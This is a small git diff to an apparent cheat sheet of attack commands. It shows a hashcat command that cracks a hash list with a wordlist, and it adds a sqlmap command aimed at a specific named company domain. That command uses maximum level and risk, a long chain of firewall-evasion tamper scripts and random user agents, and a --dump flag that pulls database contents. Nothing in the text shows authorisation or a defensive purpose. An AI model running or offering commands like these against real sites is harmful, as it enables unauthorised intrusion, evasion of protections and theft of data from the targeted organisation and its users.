@@ -45,7 +45,9 @@ https://github.com/J3rryBl4nks/PasswordCrackingMethodology
 ```
 hashcat -m 300 -a 0 -o hashcikti3a.txt hashes5k.txt weakpass_3a/weakpass_3a
 ```
-
+```
+sqlmap -u 'https://updates.frontegg.com/en?featuremonth=*' --level=5 --risk=3 --random-agent --user-agent -v3 --batch --dbs tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --technique=B --threads=10 -v3 --dump --dbms="Microsoft Access" | tee sqlSimpleMicrosoftDB.txt
+```
 
 ____________________________
 ```
